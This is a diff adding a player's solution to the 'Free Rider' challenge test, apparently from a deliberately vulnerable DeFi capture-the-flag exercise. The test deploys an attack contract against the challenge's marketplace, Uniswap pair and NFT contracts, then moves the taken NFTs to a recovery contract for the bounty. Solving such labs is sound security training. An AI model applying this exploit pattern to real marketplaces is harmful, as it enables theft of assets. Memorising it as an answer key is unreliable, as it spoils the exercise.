@@ -106,6 +106,64 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        async function logReport() {
+            async function logBalance(tag, signer) {
+                console.log(tag);
+
+                const balance = await ethers.provider.getBalance(signer.address);
+                console.log(`ETH  : ${ethers.utils.formatEther(balance)}`);
+
+                const nftBalance = await nft.balanceOf(signer.address);
+                console.log(`NFT  : ${nftBalance}`);
+
+                const wethBalance = await weth.balanceOf(signer.address);
+                console.log(`wETH : ${ethers.utils.formatEther(wethBalance)}`);
+
+                const tokenBalance = await token.balanceOf(signer.address);
+                console.log(`DVT  : ${ethers.utils.formatEther(tokenBalance)}`);
+            }
+
+            console.log();
+            console.log('--------------------------------------------');
+            console.log('Report');
+            console.log('--------------------------------------------');
+            await logBalance('Player', player);
+            console.log();
+            await logBalance('Deployer', deployer);
+            console.log();
+            await logBalance('Marketplace', marketplace);
+            console.log();
+            await logBalance('UniPair', uniswapPair);
+            console.log('--------------------------------------------');
+        }
+
+        // await logReport('Deployer', deployer);
+        
+        const Savior = await ethers.getContractFactory('SaviorFreeRider', player);
+        const savior = await Savior.deploy(
+            weth.address,
+            uniswapPair.address,
+            marketplace.address,
+            nft.address
+        );
+
+        const fee = ethers.BigNumber.from(10).pow(15).mul(46);
+        await savior.save({ value: fee });
+        
+        // await logReport('Deployer', deployer);
+
+        for(let i=0; i<5; i++)
+            await nft.connect(player).functions[
+                'safeTransferFrom(address,address,uint256,bytes)'
+            ](player.address, devsContract.address, i, []);
+        
+        const data = ethers.utils.defaultAbiCoder.encode(['address'], [player.address]);
+        await nft.connect(player).functions[
+            'safeTransferFrom(address,address,uint256,bytes)'
+        ](player.address, devsContract.address, 5, data);
+
+        // await logReport('Deployer', deployer);
     });
 
     after(async function () {
